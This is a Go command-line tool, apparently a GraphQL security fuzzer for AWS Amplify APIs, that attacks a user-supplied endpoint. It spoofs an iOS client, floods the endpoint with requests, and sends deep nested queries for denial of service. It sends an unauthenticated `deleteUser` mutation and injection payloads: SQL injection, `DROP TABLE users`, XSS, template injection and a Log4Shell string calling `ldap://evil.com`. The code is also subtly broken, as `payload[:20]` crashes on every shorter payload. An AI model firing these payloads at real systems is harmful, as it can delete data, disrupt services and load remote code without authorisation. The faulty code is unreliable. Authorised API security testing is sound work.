package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

type GraphQLQuery struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables,omitempty"`
}

type Fuzzer struct {
	endpoint  string
	headers   map[string]string
	client    *http.Client
	userAgent string
}

func NewFuzzer(endpoint string) *Fuzzer {
	return &Fuzzer{
		endpoint:  endpoint,
		headers:   make(map[string]string),
		userAgent: "aws-amplify/5.0.0 iOS/17.0",
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (f *Fuzzer) SetAuth(token string) {
	f.headers["Authorization"] = "Bearer " + token
}

func (f *Fuzzer) SetUserAgent(userAgent string) {
	f.userAgent = userAgent
}

func (f *Fuzzer) SetCustomHeader(key, value string) {
	f.headers[key] = value
}

func (f *Fuzzer) IntrospectionQuery() {
	query := `
		query IntrospectionQuery {
			__schema {
				types {
					name
					fields {
						name
						type {
							name
						}
					}
				}
			}
		}
	`
	
	fmt.Println("[*] Testing GraphQL introspection...")
	resp, err := f.sendQuery(query)
	if err != nil {
		fmt.Printf("[-] Introspection failed: %v\n", err)
		return
	}
	
	if strings.Contains(resp, "__schema") {
		fmt.Println("[+] Introspection enabled - potential security issue")
	} else {
		fmt.Println("[*] Introspection disabled")
	}
}

func (f *Fuzzer) TestDepthAttack() {
	fmt.Println("[*] Testing query depth attack...")
	
	// Build nested query
	depth := 10
	query := "query { user { posts"
	for i := 0; i < depth; i++ {
		query += " { comments"
	}
	for i := 0; i < depth; i++ {
		query += " }"
	}
	query += " } }"
	
	start := time.Now()
	_, err := f.sendQuery(query)
	elapsed := time.Since(start)
	
	if err != nil {
		fmt.Printf("[*] Depth attack blocked: %v\n", err)
	} else if elapsed > 5*time.Second {
		fmt.Println("[+] Possible DoS vulnerability - query took", elapsed)
	}
}

func (f *Fuzzer) TestBatchingAttack() {
	fmt.Println("[*] Testing query batching attack...")
	
	queries := []GraphQLQuery{
		{Query: "query { user(id: 1) { email } }"},
		{Query: "query { user(id: 2) { email } }"},
		{Query: "query { user(id: 3) { email } }"},
	}
	
	body, _ := json.Marshal(queries)
	req, _ := http.NewRequest("POST", f.endpoint, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/json")
	
	for k, v := range f.headers {
		req.Header.Set(k, v)
	}
	
	resp, err := f.client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		fmt.Println("[+] Batching enabled - potential enumeration vector")
	} else {
		fmt.Println("[*] Batching disabled or restricted")
	}
}

func (f *Fuzzer) TestAuthBypass() {
	fmt.Println("[*] Testing authorization bypass...")
	
	// Test without auth
	oldAuth := f.headers["Authorization"]
	delete(f.headers, "Authorization")
	
	queries := []string{
		"query { users { id email } }",
		"query { admin { settings } }",
		"mutation { deleteUser(id: 1) }",
	}
	
	for _, q := range queries {
		resp, err := f.sendQuery(q)
		if err == nil && !strings.Contains(resp, "unauthorized") {
			fmt.Printf("[+] Possible auth bypass: %s\n", q)
		}
	}
	
	// Restore auth
	if oldAuth != "" {
		f.headers["Authorization"] = oldAuth
	}
}

func (f *Fuzzer) TestInjection() {
	fmt.Println("[*] Testing injection vulnerabilities...")
	
	payloads := []string{
		`' OR '1'='1`,
		`"; DROP TABLE users; --`,
		`<script>alert(1)</script>`,
		`${jndi:ldap://evil.com/a}`,
		`{{7*7}}`,
	}
	
	for _, payload := range payloads {
		query := fmt.Sprintf(`query { user(name: "%s") { id } }`, payload)
		resp, _ := f.sendQuery(query)
		
		if strings.Contains(resp, "error") || strings.Contains(resp, "syntax") {
			fmt.Printf("[*] Injection attempt blocked: %s\n", payload[:20])
		}
	}
}

func (f *Fuzzer) TestRateLimit() {
	fmt.Println("[*] Testing rate limiting...")
	
	query := "query { user { id } }"
	success := 0
	
	for i := 0; i < 100; i++ {
		_, err := f.sendQuery(query)
		if err == nil {
			success++
		}
		time.Sleep(10 * time.Millisecond)
	}
	
	if success == 100 {
		fmt.Println("[+] No rate limiting detected - DoS risk")
	} else {
		fmt.Printf("[*] Rate limiting active (success: %d/100)\n", success)
	}
}

func (f *Fuzzer) sendQuery(query string) (string, error) {
	gql := GraphQLQuery{Query: query}
	body, _ := json.Marshal(gql)
	
	req, err := http.NewRequest("POST", f.endpoint, bytes.NewBuffer(body))
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", f.userAgent)
	req.Header.Set("X-Device-Type", "iPhone")
	req.Header.Set("X-OS-Version", "iOS 17.0")
	for k, v := range f.headers {
		req.Header.Set(k, v)
	}
	
	resp, err := f.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	respBody, _ := ioutil.ReadAll(resp.Body)
	return string(respBody), nil
}

func main() {
	var (
		endpoint  = flag.String("endpoint", "", "GraphQL endpoint URL")
		token     = flag.String("token", "", "JWT token for authentication")
		userAgent = flag.String("user-agent", "", "Custom User-Agent string")
		header    = flag.String("header", "", "Custom header in format 'Key:Value'")
		all       = flag.Bool("all", false, "Run all tests")
	)
	
	flag.Parse()
	
	if *endpoint == "" {
		fmt.Println("Usage: amplify_api_fuzzer -endpoint <URL> [-token <JWT>] [-all]")
		return
	}
	
	fuzzer := NewFuzzer(*endpoint)
	
	if *token != "" {
		fuzzer.SetAuth(*token)
	}
	
	if *userAgent != "" {
		fuzzer.SetUserAgent(*userAgent)
	}
	
	if *header != "" {
		parts := strings.SplitN(*header, ":", 2)
		if len(parts) == 2 {
			fuzzer.SetCustomHeader(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
	
	fmt.Println("[*] Starting AWS Amplify API Fuzzer")
	fmt.Printf("[*] Target: %s\n\n", *endpoint)
	
	if *all {
		fuzzer.IntrospectionQuery()
		fuzzer.TestDepthAttack()
		fuzzer.TestBatchingAttack()
		fuzzer.TestAuthBypass()
		fuzzer.TestInjection()
		fuzzer.TestRateLimit()
	} else {
		fuzzer.IntrospectionQuery()
		fuzzer.TestAuthBypass()
	}
	
	fmt.Println("\n[+] Fuzzing complete")
}